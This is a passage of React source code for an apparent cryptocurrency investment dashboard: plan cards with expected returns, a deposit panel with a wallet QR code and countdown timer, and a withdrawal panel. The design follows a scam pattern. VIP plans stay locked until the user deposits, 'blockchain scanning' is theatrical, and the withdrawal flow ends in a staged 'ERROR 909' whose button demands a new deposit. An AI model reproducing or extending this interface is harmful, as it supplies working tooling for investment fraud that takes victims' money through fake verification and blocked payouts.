                  <div className="flex justify-between items-start mb-3 md:mb-4 overflow-hidden">
                    <h4 className="text-white font-black text-xs md:text-sm uppercase tracking-tight truncate mr-2 flex items-center gap-2">
                      {plan.name}
                      {plan.vip && <span className="bg-[#f01a64] text-white text-[8px] px-1.5 py-0.5 rounded">VIP</span>}
                    </h4>
                    <span className="text-[#00b36b] font-black text-[8px] md:text-[10px] bg-[#00b36b]/10 px-2 py-0.5 rounded flex-shrink-0">
                       Exp {plan.minRet}%-{plan.maxRet}%
                    </span>
                  </div>
                  <div className="flex justify-between items-end">
                    <div className="min-w-0">
                      <span className="text-[7px] md:text-[8px] text-gray-500 font-black uppercase block">Duration</span>
                      <span className="text-gray-300 font-bold text-[10px] md:text-xs uppercase truncate block">{plan.duration}</span>
                    </div>
                    <button className={`px-4 py-1.5 rounded-xl font-black text-[8px] md:text-[9px] uppercase tracking-widest flex-shrink-0 ${selectedPlanId === plan.id ? 'bg-[#f01a64] text-white' : 'bg-[#131722] text-[#f01a64] border border-pink-500/30'}`}>
                      {selectedPlanId === plan.id ? 'SELECTED' : (plan.vip && !user.hasDeposited ? 'LOCKED' : 'SELECT')}
                    </button>
                  </div>
                  {selectedPlanId === plan.id && (
                    <div className="mt-4 pt-4 border-t border-[#2a2e39] animate-in slide-in-from-top-4">
                      <div className="flex gap-2">
                        <input type="number" value={investAmount} onChange={(e) => setInvestAmount(Number(e.target.value))} className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-3 py-2 text-[10px] text-white focus:outline-none focus:border-[#f01a64] font-black" />
                        <button onClick={(e) => { e.stopPropagation(); startInvestment(); }} className="bg-[#00b36b] text-white px-3 py-2 rounded-xl font-black text-[8px] md:text-[9px] uppercase active:scale-95 whitespace-nowrap">START EXECUTION</button>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-6 md:8" ref={depositSectionRef}>
            {/* INSTITUTIONAL DEPOSIT PANEL */}
            <div className="bg-[#1e222d] border border-[#2a2e39] p-0 rounded-[1.5rem] md:rounded-[2.5rem] shadow-2xl relative overflow-hidden">
              <div className="p-6 md:p-8 bg-gradient-to-b from-[#131722] to-[#1e222d] border-b border-[#2a2e39]">
                <div className="flex justify-between items-center mb-6">
                  <h3 className="text-base md:text-lg font-black text-white uppercase tracking-tighter flex items-center gap-2">
                    <svg className="w-4 h-4 md:w-5 md:h-5 text-[#f01a64]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4"/></svg>
                    Secure Deposit
                  </h3>
                  <div className="flex items-center gap-2 px-3 py-1 bg-red-500/10 rounded-lg border border-red-500/20">
                     <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse"></div>
                     <span className="text-[9px] font-black text-red-500 uppercase tracking-widest">Session: {formatTime(timeLeft)}</span>
                  </div>
                </div>
                
                <div className="space-y-2">
                  <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Select Channel</label>
                  <div className="grid grid-cols-1 gap-1.5">
                    {NETWORKS.map(net => (
                      <button 
                        key={net.id}
                        onClick={() => setDepositNetwork(net)}
                        className={`px-4 py-3 rounded-xl text-[8px] md:text-[9px] font-black uppercase border transition-all text-left flex justify-between items-center ${depositNetwork.id === net.id ? 'bg-[#f01a64] text-white border-[#f01a64] shadow-lg' : 'bg-[#131722] text-gray-400 border-[#2a2e39] hover:bg-[#1a1e27]'}`}
                      >
                        <span>{net.name}</span>
                        {depositNetwork.id === net.id && <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>}
                      </button>
                    ))}
                  </div>
                </div>
              </div>

              <div className="p-6 md:p-8 space-y-6">
                 {/* QR & ADDRESS */}
                 <div className="bg-[#131722] border border-[#2a2e39] rounded-2xl p-5 flex flex-col items-center text-center relative group">
                    <div className="absolute top-2 right-2 flex gap-1">
                      <span className="w-1 h-1 bg-[#00b36b] rounded-full"></span>
                      <span className="w-1 h-1 bg-[#00b36b] rounded-full"></span>
                      <span className="w-1 h-1 bg-[#00b36b] rounded-full"></span>
                    </div>
                    
                    <img 
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${depositNetwork.address}&color=f01a64&bgcolor=131722`} 
                      alt="Deposit QR" 
                      className="w-32 h-32 mb-4 rounded-xl border-4 border-[#1e222d] shadow-2xl"
                    />
                    
                    <div className="w-full bg-[#1e222d] border border-[#2a2e39] rounded-xl p-3 mb-3 relative overflow-hidden">
                       <p className="text-[9px] font-mono text-gray-400 break-all leading-tight select-all">{depositNetwork.address}</p>
                       <div className="absolute inset-0 bg-white/5 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"></div>
                    </div>

                    <button onClick={handleCopy} className={`w-full py-2.5 rounded-lg text-[9px] font-black uppercase transition-all active:scale-95 flex items-center justify-center gap-2 ${copied ? 'bg-[#00b36b] text-white' : 'bg-[#2a2e39] text-gray-300 hover:text-white'}`}>
                      {copied ? 'Address Copied to Clipboard' : 'Tap to Copy Address'}
                    </button>
                 </div>

                 {/* NETWORK STATS */}
                 <div className="grid grid-cols-2 gap-3">
                    <div className="bg-[#131722] p-2 rounded-lg border border-[#2a2e39] text-center">
                       <span className="text-[7px] text-gray-600 font-black uppercase block">Network Load</span>
                       <span className="text-[9px] text-[#00b36b] font-black uppercase">Low (Optimal)</span>
                    </div>
                    <div className="bg-[#131722] p-2 rounded-lg border border-[#2a2e39] text-center">
                       <span className="text-[7px] text-gray-600 font-black uppercase block">Gas Fee</span>
                       <span className="text-[9px] text-[#00b36b] font-black uppercase">Covered by System</span>
                    </div>
                 </div>

                 {/* WARNING */}
                 <div className="bg-amber-500/5 border border-amber-500/20 p-3 rounded-lg flex items-start gap-3">
                    <svg className="w-4 h-4 text-amber-500 shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
                    <p className="text-[9px] text-gray-400 leading-tight">
                       <span className="text-amber-500 font-bold">IMPORTANT:</span> Send only <span className="text-white">{depositNetwork.name}</span> to this address. Sending any other asset may result in permanent loss.
                    </p>
                 </div>

                 {/* PROOF UPLOAD */}
                 <div className="space-y-3 pt-4 border-t border-[#2a2e39]">
                    <div className="space-y-1">
                       <label className="text-[7px] text-gray-500 font-black uppercase tracking-widest block">Transaction Hash (TXID)</label>
                       <input 
                         type="text" 
                         value={txId} 
                         onChange={(e) => setTxId(e.target.value)} 
                         placeholder="Paste transaction hash..." 
                         className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-3 py-3 text-[10px] text-white font-mono focus:outline-none focus:border-[#f01a64]"
                       />
                    </div>
                    
                    <input type="file" ref={fileInputRef} onChange={handleFileChange} accept="image/*" className="hidden" />
                    <button onClick={triggerUpload} disabled={uploadStatus === 'uploading'} className={`w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 shadow-lg ${uploadStatus === 'success' ? 'bg-[#00b36b] text-white' : uploadStatus === 'failed' ? 'bg-red-500 text-white' : 'bg-[#f01a64] text-white hover:bg-pink-700'}`}>
                      {uploadStatus === 'idle' ? 'UPLOAD PROOF & VERIFY' : uploadStatus === 'uploading' ? 'SCANNING BLOCKCHAIN...' : uploadStatus === 'success' ? 'DEPOSIT CONFIRMED' : 'VERIFICATION FAILED'}
                    </button>
                    {auditMessage && <p className={`text-[8px] text-center font-black uppercase leading-tight ${uploadStatus === 'success' ? 'text-[#00b36b]' : 'text-gray-500'}`}>{auditMessage}</p>}
                 </div>
              </div>
            </div>

            {/* WITHDRAW PANEL */}
            <div className="bg-[#1e222d] border border-[#2a2e39] p-6 md:p-8 rounded-[1.5rem] md:rounded-[2.5rem] shadow-2xl relative">
              <h3 className="text-base md:text-lg font-black text-white uppercase tracking-tighter mb-6 text-center">Withdraw Payout</h3>
              
              <div className="text-right mb-1">
                <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest">Available Liquidity: <span className="text-[#00b36b]">${user.balance.toLocaleString()}</span></span>
              </div>

              {withdrawStage === 'idle' || withdrawStage === 'connecting' ? (
                <div className="space-y-5">
                  <div className="space-y-1.5">
                    <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Recipient Wallet (TRC-20)</label>
                    <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="T..." className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-[10px] text-white font-black focus:outline-none focus:border-[#00b36b]" />
                  </div>
                  
                  <div className="space-y-1.5">
                    <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Withdraw Amount (USDT)</label>
                    <div className="relative">
                      <input 
                        type="number" 
                        value={withdrawAmount} 
                        onChange={(e) => setWithdrawAmount(e.target.value)} 
                        placeholder="Enter Amount..." 
                        className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-sm text-white font-black focus:outline-none focus:border-[#00b36b] placeholder:text-gray-600" 
                      />
                      <button 
                        onClick={handleMaxWithdraw}
                        className="absolute right-2 top-1/2 -translate-y-1/2 bg-[#2a2e39] hover:bg-[#353a47] text-[#00b36b] text-[8px] font-black uppercase px-2 py-1 rounded-lg transition-colors"
                      >
                        MAX
                      </button>
                    </div>
                  </div>

                  <button 
                    onClick={handleWithdraw} 
                    disabled={!withdrawAddress.trim() || !withdrawAmount || parseFloat(withdrawAmount) <= 0 || withdrawStage === 'connecting'} 
                    className="w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 bg-[#f01a64] text-white hover:bg-pink-700 disabled:opacity-50 disabled:bg-[#2a2e39] disabled:text-gray-500 shadow-lg"
                  >
                    {withdrawStage === 'connecting' 
                      ? 'ESTABLISHING SECURE LINK...' 
                      : (withdrawAmount && parseFloat(withdrawAmount) > 0) 
                        ? `INITIATE $${parseFloat(withdrawAmount).toLocaleString()} PAYOUT`
                        : 'ENTER WITHDRAWAL AMOUNT'
                    }
                  </button>
                </div>
              ) : (
                <div className="bg-[#0d1117] border border-[#2a2e39] rounded-xl p-4 font-mono text-[9px] h-48 overflow-y-auto space-y-2">
                   {withdrawLogs.map((log, i) => (
                     <div key={i} className={`animate-in slide-in-from-left duration-200 ${log.includes('ERROR') ? 'text-red-500 font-bold' : log.includes('SUCCESS') || log.includes('CONFIRMED') ? 'text-[#00b36b]' : log.includes('RE-ROUTING') ? 'text-amber-500' : 'text-gray-400'}`}>
                       {log}
                     </div>
                   ))}
                   {withdrawStage === 'error' && (
                     <button 
                       onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })}
                       className="w-full mt-4 bg-[#f01a64] text-white py-2 rounded uppercase font-black animate-pulse"
                     >
                       RESOLVE ERROR 909: DEPOSIT NOW
                     </button>
                   )}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
